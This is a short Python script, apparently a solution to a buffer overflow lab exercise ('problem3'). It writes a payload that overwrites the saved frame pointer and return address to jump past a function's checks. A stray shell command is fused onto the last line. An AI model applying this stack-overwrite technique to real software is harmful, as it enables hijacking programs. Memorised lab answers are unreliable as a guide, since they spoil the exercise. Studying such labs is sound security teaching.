import struct

# 1. 地址定义
# 跳过 func1 的参数检查和栈帧建立，直接跳转到加载字符串的位置
# 40122b: 48 b8 59 6f 75 72 20  movabs $0x63756c2072756f59,%rax
target_addr = 0x40122b

# 一个可读写的地址用来做 Fake RBP，防止 func1 内部寻址崩溃
# 这里选取 .bss 或 .data 段的一个地址，例如 saved_rsp 变量的地址
fake_rbp = 0x403510 

# 2. 构造 Payload
# Buffer (32)
padding = b'A' * 32

# Saved RBP (8) -> Fake RBP
# 当 func 执行 leave 时，这个值会被 pop 到 RBP 寄存器
rbp_val = struct.pack('<Q', fake_rbp)

# Return Address (8) -> Target
ret_addr = struct.pack('<Q', target_addr)

payload = padding + rbp_val + ret_addr

# 3. 写入文件
filename = "ans3.txt"
with open(filename, "wb") as f:
    f.write(payload)

print(f"[+] Payload written to {filename}")
print(f"[+] Jump to: {hex(target_addr)}")chmod +x problem3